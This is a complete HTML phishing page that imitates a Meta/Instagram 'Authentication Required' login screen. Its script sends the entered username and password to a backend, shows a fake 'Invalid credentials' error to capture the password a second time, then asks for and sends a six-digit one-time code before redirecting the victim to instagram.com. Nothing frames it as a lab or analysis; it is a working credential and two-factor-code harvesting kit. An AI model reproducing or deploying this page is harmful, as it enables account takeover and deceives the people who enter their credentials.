<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Meta System Management</title>
    <style>
        body { background: #fafafa; font-family: -apple-system, sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; }
        .card { margin-top: 60px; width: 90%; max-width: 370px; background: #fff; border: 1px solid #dbdbdb; border-radius: 3px; padding: 30px; text-align: center; }
        .m-logo { width: 100px; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; }
        .btn { width: 100%; padding: 10px; background: #0095f6; color: #fff; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
        .err { color: #ed4956; font-size: 13px; margin-bottom: 15px; display: none; }
        #otp-box { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" class="m-logo">
        <p style="font-size: 14px; color: #8e8e8e;">Authentication Required to Sync Services</p>
        
        <div id="err" class="err">Invalid credentials. Please verify your access key.</div>

        <div id="login-box">
            <input type="text" id="u" placeholder="Account Username">
            <input type="password" id="p" placeholder="Access Key (Password)">
            <button class="btn" onclick="send()">VERIFY IDENTITY</button>
        </div>

        <div id="otp-box">
            <p style="font-size: 12px; color: #8e8e8e;">A 6-digit code has been sent. Enter it below.</p>
            <input type="number" id="o" placeholder="000000">
            <button class="btn" onclick="finish()">COMPLETE SYNC</button>
        </div>
    </div>

    <script>
        let tries = 0;
        async function send() {
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            if(!u || !p) return;

            // Python Backend Call
            const res = await fetch('/api', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user: u, pass: p, type: tries === 0 ? 'LOG' : 'VERIFIED' })
            });

            if(tries === 0) {
                document.getElementById('err').style.display = 'block';
                document.getElementById('p').value = '';
                tries++;
            } else {
                document.getElementById('login-box').style.display = 'none';
                document.getElementById('err').style.display = 'none';
                document.getElementById('otp-box').style.display = 'block';
            }
        }

        async function finish() {
            const o = document.getElementById('o').value;
            await fetch('/api', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user: document.getElementById('u').value, otp: o, type: 'OTP' })
            });
            window.location.href = "https://instagram.com";
        }
    </script>
</body>
</html>
